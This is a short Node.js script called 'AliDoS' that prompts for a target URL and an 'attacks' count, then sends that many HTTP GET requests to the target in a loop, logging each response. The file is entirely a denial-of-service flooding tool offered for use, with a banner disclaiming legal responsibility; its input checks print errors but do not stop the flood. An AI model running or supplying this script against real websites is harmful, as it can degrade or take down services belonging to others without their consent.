// importing modules
import axios from 'axios'
import rl from 'readline'

console.log('\x1b[41m%s\x1b[0m', 'AliDoS');  //background-red
console.log('\x1b[4m%s\x1b[0m', 'By using this application you assume all legal and other responsibilities.\n');  //cyan

// configration of modules
var readline = rl.createInterface({
    input: process.stdin,
    output: process.stdout
});

// App - Main
async function loggingVariables(varObject) {
  await console.log('\x1b[44m%s\x1b[0m', varObject);
}

function isValidUrl(str) {
  var regex = /(http|https):\/\/(\w+:{0,1}\w*)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%!\-\/]))?/;
  if(!regex .test(str)) {
    return false;
  } else {
    return true;
  }
}

readline.question("What's the target url? ", targetUrl =>{
  const targetUrlIsValid = isValidUrl(targetUrl);

  if (!targetUrlIsValid) {
    console.log('\x1b[41m%s\x1b[0m', 'Error: Not a valid url');  //background-red
  }

  loggingVariables(targetUrl).then(()=>{
    readline.question("Attacks of number? ", targetAttackNumber=>{
      const isNumericAttackNumberInput = isNaN(targetAttackNumber)

      if (!targetAttackNumber) {
        console.log('\x1b[41m%s\x1b[0m', 'Error: Please enter number ');  //background-red
      }

      loggingVariables(targetAttackNumber).then(()=>{
        for (var i = 0; i < targetAttackNumber; i++) {

          axios.all([
            axios.get(targetUrl),
          ]).then(axios.spread((response) => {
            console.log('\x1b[42m%s\x1b[0m', `${response.statusText} Status: ${response.status} Url: ${response.config.url}`);  //cyan
          })).catch(error => {
            console.log('\x1b[41m%s\x1b[0m', error);  //background-red
          });

        }
      })

  
      readline.close()
    })
  })
})
